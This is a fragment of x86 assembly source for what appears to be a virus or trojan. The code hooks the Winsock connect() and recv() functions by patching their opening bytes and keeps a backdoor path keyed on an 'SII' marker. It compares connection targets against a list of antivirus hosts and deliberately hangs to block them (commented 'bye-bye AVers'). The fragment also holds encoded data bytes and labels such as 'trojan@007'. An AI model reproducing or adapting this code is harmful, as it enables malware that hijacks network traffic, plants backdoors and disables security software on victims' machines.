   db 0c0h,029h,005h,054h,086h,064h,007h,0a1h,0cdh,0b2h,0b4h,00ah,0c1h,004h,0d2h,064h
   db 0d8h,0ebh,0fah,01ah,0c6h,0fch,02dh,0a6h,03eh,095h,002h,004h,0c2h,057h,044h,02eh
   db 0c3h,002h,046h,026h,0d1h,00bh,008h,0e3h,0a8h,090h,07fh,02ah,0a8h,090h,00fh,04eh
   db 0d1h,05fh,068h,0f1h,0c1h,0f7h,096h,071h,0a8h,090h,07fh,02ah,0c8h,0b1h,060h,068h
   db 0a1h,045h,003h,06ah,0c1h,0f7h,096h,071h

   av_host1:

   pop esi

   lea eax, [edi+4]
   push 4
   push eax
   call [ebp+(offset wsock_IsBadReadPtr - offset delta_x)]

   dec eax
   jz host_back

   mov ecx, AV_NUM
   mov ebx, [edi+4]   ;   endereco AV ?
   test ebx, ebx
   jz host_back

   av_host2:

   lodsd
   cmp ebx, eax
   je block_host
   loop av_host2

   host_back:

   IFDEF NETSEH

   pop dword ptr fs:[0]
   pop eax

   ENDIF

   jmp ret_connect

   host_error:

   IFDEF NETSEH

   mov esp, [esp+8]
   pop dword ptr fs:[0]
   pop eax

   ENDIF

   ret_connect:

   popad
   popf

   db 0b8h
   ap_connect dd 0
   jmp eax

   av_request_num dd 0
   mark_crypt db 'XY'

   connect_repcode:

   pushf
   pushad
   call delta_x

   lea eax, [esp+(4*7)+(4*1)+(4*1)+(4*4)]
   cmp [eax], 'SII'
   jne no_connect_backdoor
   lea ecx, [ebp+(offset jump_connect_byte - offset delta_x)]
   mov [eax], ecx

   no_connect_backdoor:

   mov edi, dword ptr [ebp+(offset ap_connect - offset delta_x)]
   call $+5+16
   jump_connect_byte dd 0,0
   orig_connect_byte dd 0,0
   pop esi
   movsd
   movsd
   popad
   popf
   push 12345678h
   push_ret_connect equ dword ptr $-4
   ret

   trojan@007:

   ; recv()

   lea eax, [ebp+(offset recv_repcode - offset delta_x)]
   xchg dword ptr [esp+(4*1)+(4*7)+(4*1)], eax         ;   return address
   mov dword ptr [ebp+(offset push_ret_recv - offset delta_x)], eax

   mov edi, dword ptr [ebp+(offset ap_recv - offset delta_x)]
   lea esi, dword ptr [ebp+(offset orig_recv_byte - offset delta_x)]
   movsd
   movsd

   mov ecx,[esp+(4*1)+(4*7)+(4*1)+(4*3)]   ;   size of the buffer
   mov esi,[esp+(4*1)+(4*7)+(4*1)+(4*2)]   ;   incoming data
   mov edx,[esp+(4*1)+(4*7)+(4*1)+(4*1)]   ;   socket

   ; some operation...

   ret_recv:

   popad
   popf

   db 0b8h
   ap_recv dd 0
   jmp eax

   recv_repcode:

   pushf
   pushad
   call delta_x

   lea eax, [esp+(4*1)+(4*7)+(4*1)+(4*5)]
   cmp [eax], 'SII'
   jne no_recv_backdoor
   lea ecx, [ebp+(offset jump_recv_byte - offset delta_x)]
   mov [eax], ecx

   no_recv_backdoor:

   mov edi, dword ptr [ebp+(offset ap_recv - offset delta_x)]
   call $+5+16
   jump_recv_byte dd 0,0
   orig_recv_byte dd 0,0
   pop esi
   movsd
   movsd
   popad
   popf
   push 12345678h
   push_ret_recv equ dword ptr $-4
   ret

   rnd:

   push ecx
   push edx
   mov eax, 2df5a7ech
   matrix equ dword ptr $-4
   mov ecx,41C64E6Dh
   mul ecx
   add eax,00003039h
   and eax,7FFFFFFFh
   mov [matrix], eax
   pop edx
   pop ecx
   ret

   block_host:   ;   bye-bye AVers...

   jmp $

   dd 0  ;  b64

   trojan@002:
